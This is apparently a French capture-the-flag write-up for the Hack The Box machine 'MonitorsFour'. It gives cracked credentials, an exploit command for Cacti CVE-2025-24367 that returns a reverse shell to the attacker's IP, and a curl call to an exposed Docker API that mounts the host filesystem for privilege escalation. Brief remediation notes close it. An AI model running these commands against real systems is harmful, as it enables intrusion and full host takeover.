---
id: "HTB-2026-MONITORSFOUR"
title: "MonitorsFour"
excerpt: "Sur MonitorsFour, des identifiants crackés permettent une RCE Cacti, puis l'accès au socket Docker local expose le système de fichiers hôte et le flag root."
date: "2025-12-06"
tags: ["WRITEUP", "HACKTHEBOX", "WINDOWS", "EASY", "CACTI", "CVE-2025-24367", "DOCKER-ESCAPE"]
category: "WRITEUP"
platform: "HACKTHEBOX"
target_os: "WINDOWS"
difficulty: "EASY"
icon: "Terminal"
author: "0x7CC"
published: true
---

## TL;DR
Sur **MonitorsFour**, l'accès initial utilise des identifiants crackés pour exploiter une vulnérabilité d'exécution de code à distance (RCE) dans les modèles de graphiques Cacti (CVE-2025-24367). L'élévation s'effectue en exploitant l'accès à l'API Docker locale pour monter le système de fichiers hôte et lire le flag root.

---

## Cible
- Host : `monitorsfour.htb`
- IP : `10.129.7.62`

---

## Recon : Cracking d'identifiants
Nous crackons le hash MD5 du compte `marcus` :
- Utilisateur : `marcus`
- Mot de passe : `wonderful1`

---

## Accès Initial : RCE Cacti (CVE-2025-24367)
Nous nous connectons sur Cacti et exploitons CVE-2025-24367 via un script d'exploitation :

```bash
python exploit.py -u marcus -p wonderful1 -url http://cacti.monitorsfour.htb -i 10.10.15.149 -l 60001
```

Cela nous renvoie un shell dans un conteneur Docker sous l'utilisateur `www-data`.

---

## Élévation de privilèges : Échappement Docker
Nous découvrons que le socket Docker ou son port d'écoute (`192.168.65.7:2375`) est accessible depuis le conteneur.

Nous appelons l'API Docker pour créer un conteneur privilégié avec le montage de la racine hôte :

```bash
curl -X POST -H "Content-Type: application/json" \
  http://192.168.65.7:2375/containers/create \
  -d '{"Image": "docker_setup-nginx-php:latest", "Cmd": ["/bin/bash"], "HostConfig": {"Binds": ["/mnt/host/c:/host_root"]}}'
```

Une fois démarré, nous accédons au dossier `/host_root/Users/Administrator/Desktop` pour récupérer le flag root.

---

## Notes défensives / remédiation

### Correctif
- Mettre à jour Cacti vers une version patchée.
- Ne pas monter le socket Docker ni exposer le port 2375 aux conteneurs non-privilégiés.

---

## Annexe : Résumé de la timeline
1. Récupération des identifiants de marcus.
2. Exploitation de Cacti pour obtenir un reverse shell dans le conteneur.
3. Abus de l'API Docker pour monter la racine de l'hôte et obtenir root.

---
